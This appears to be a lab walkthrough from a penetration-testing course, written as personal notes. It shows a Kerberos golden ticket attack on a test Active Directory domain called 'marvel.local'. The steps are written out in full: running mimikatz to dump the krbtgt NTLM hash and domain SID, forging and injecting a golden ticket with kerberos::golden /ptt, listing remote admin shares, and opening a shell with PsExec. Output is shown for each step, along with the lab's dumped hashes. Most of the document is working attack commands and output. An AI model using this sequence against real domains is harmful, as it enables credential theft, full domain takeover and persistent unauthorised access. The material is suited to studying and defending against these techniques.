#SID #krbtgt #mimikatz #psexec  

Once we have the SID and krbtgt hash, we can generate a ticket  
# What is it?

- When we compromise the krbtgt account, we own the domain
- We can request access to any resource or system on the domain  
- Golden tickets == complete access to every machine

We can utilize Mimikatz to obtain the information necessary to perform this attack

`mimikatz.exe`

`privilege::debug`​

`lsadump::lsa /inject /name:krbtgt`​

- dumps the information for the krbtgt account
- need:
	- krbtgt ntlm hash
	- domain SID  
`Start-Process -FilePath "C:\Users\administrator\Downloads\mimikatz.exe" -Verb RunAs`

Results:
```
C:\Users\Administrator\Downloads>mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # lsadump::lsa /inject /name:krbtgt
Domain : MARVEL / S-1-5-21-3809429150-595446586-675097592

RID  : 000001f6 (502)
User : krbtgt

 * Primary
    NTLM : 60163dd27f6c523edea3d171b2687db4
    LM   :
  Hash NTLM: 60163dd27f6c523edea3d171b2687db4
    ntlm- 0: 60163dd27f6c523edea3d171b2687db4
    lm  - 0: d315786f2f638a2e2c982770db7ea983

 * WDigest
    01  6b3668ccfc3c1d765603cf763cacb54a
    02  4cf7548763b61e728a8623a1f56d9b9b
    03  f22deb1da72e103d65ca15d76d3d8a90
    04  6b3668ccfc3c1d765603cf763cacb54a
    05  4cf7548763b61e728a8623a1f56d9b9b
    06  a2c6cc4a2a336f39994c316c27888da9
    07  6b3668ccfc3c1d765603cf763cacb54a
    08  82dd34d799a60d5c23e77d9495bef622
    09  b74cebf217f1497daab39baeed14377f
    10  070b118912dcdea684c702df2aba5c4c
    11  0e8c8a46947a5e40b772dbfb27efbff8
    12  b74cebf217f1497daab39baeed14377f
    13  917191fb7394c19fd6f353cd2cc59415
    14  0e8c8a46947a5e40b772dbfb27efbff8
    15  822ba92fff48689533633f002553f9df
    16  7e0b4051e149308d32be5b37391ac0c0
    17  707f1b31554829ace41fc22a641ee103
    18  f1c8438ccc91ba9c5b680e4e6d31a93a
    19  c10c26ebfc309987e143016e8c385dfd
    20  aaddf72b4a0a329bc236b9999f020b55
    21  2b55aad6f97b08c414e3b9f87c912f95
    22  2b55aad6f97b08c414e3b9f87c912f95
    23  bae97097016b2d97a995aa8372eddb3a
    24  8df01a1c50c1975ac9af45f0a6e05d4f
    25  0904c15efad7b5815e91dfb4712610fa
    26  b5f40647fb597b91cd5562a90e219f24
    27  cd59636c9b469005a368fa2eab515c69
    28  6d75014e3c903a77eb7553596b07e4c7
    29  c395aac429e46c78175d4820ab962143

 * Kerberos
    Default Salt : MARVEL.LOCALkrbtgt
    Credentials
      des_cbc_md5       : 4546cb2f1c13c754

 * Kerberos-Newer-Keys
    Default Salt : MARVEL.LOCALkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 981ff0f170cdae1af3126454e6be4992a97ab314de13310f0328a09067aac089
      aes128_hmac       (4096) : cb381cd42cd961408bce258de2880686
      des_cbc_md5       (4096) : 4546cb2f1c13c754

 * NTLM-Strong-NTOWF
    Random Value : 50e5c535ed079c714856f6f480984d70
```


Once we have the SID and krbtgt hash, we can generate a ticket (in mimikatz)  

`kerberos::golden /User:Administrator /domain:marvel.local /sid:S-1-5-21-3809429150-595446586-675097592 /krbtgt:60163dd27f6c523edea3d171b2687db4 /id:500 /ptt`​

- /User can be a fake user, /domain must be real  

Result:
```
mimikatz # kerberos::golden /User:Administrator /domain:marvel.local /sid:S-1-5-21-3809429150-595446586-675097592 /krbtgt:60163dd27f6c523edea3d171b2687db4 /id:500 /ptt
User      : Administrator
Domain    : marvel.local (MARVEL)
SID       : S-1-5-21-3809429150-595446586-675097592
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: 60163dd27f6c523edea3d171b2687db4 - rc4_hmac_nt
Lifetime  : 7/6/2024 10:12:07 AM ; 7/4/2034 10:12:07 AM ; 7/4/2034 10:12:07 AM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'Administrator @ marvel.local' successfully submitted for current session
```


`misc::cmd`​

With a Golden Ticket, we can now access other machines from the cmd line

`dir \\10.0.0.25\C$   `
`dir \\THEPUNISHER\c$`

Results:
```
C:\Users\Administrator\Downloads>whoami
marvel\administrator

C:\Users\Administrator\Downloads>dir \\THEPUNISHER\c$
 Volume in drive \\THEPUNISHER\c$ has no label.
 Volume Serial Number is C810-5545

 Directory of \\THEPUNISHER\c$

07/03/2024  11:52 AM             1,191 @test.lnk
12/07/2019  02:14 AM    <DIR>          PerfLogs
06/28/2024  04:15 PM    <DIR>          Program Files
09/07/2022  08:16 PM    <DIR>          Program Files (x86)
06/26/2024  11:01 AM    <DIR>          Users
07/03/2024  12:10 PM    <DIR>          Windows
               1 File(s)          1,191 bytes
               5 Dir(s)  32,323,223,552 bytes free

C:\Users\Administrator\Downloads>dir \\SPIDERMAN\c$
 Volume in drive \\SPIDERMAN\c$ has no label.
 Volume Serial Number is 0815-C3C4

 Directory of \\SPIDERMAN\c$

12/07/2019  02:14 AM    <DIR>          PerfLogs
06/28/2024  04:10 PM    <DIR>          Program Files
09/07/2022  08:16 PM    <DIR>          Program Files (x86)
06/26/2024  10:35 AM    <DIR>          Users
06/29/2024  08:50 AM    <DIR>          Windows
               0 File(s)              0 bytes
               5 Dir(s)  39,861,657,600 bytes free
```
​​​
`Exec64.exe \\10.0.0.25 cmd.exe`​
`psexec.exe \\THEPUNISHER cmd.exe`
- (psexec.exe is a Windows tool.run it in the Golden Ticket session against another domain user/account to get a shell)
`whoami`​
`hostname`​

Results:
```
C:\Users\Administrator\Downloads>PsExec.exe \\THEPUNISHER cmd.exe

PsExec v2.43 - Execute processes remotely
Copyright (C) 2001-2023 Mark Russinovich
Sysinternals - www.sysinternals.com


Microsoft Windows [Version 10.0.19045.2006]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
marvel\administrator

C:\Windows\system32>hostname
THEPUNISHER
```


Golden Ticket is persistence. Silver Ticket is stealthier than Golden Ticket.  

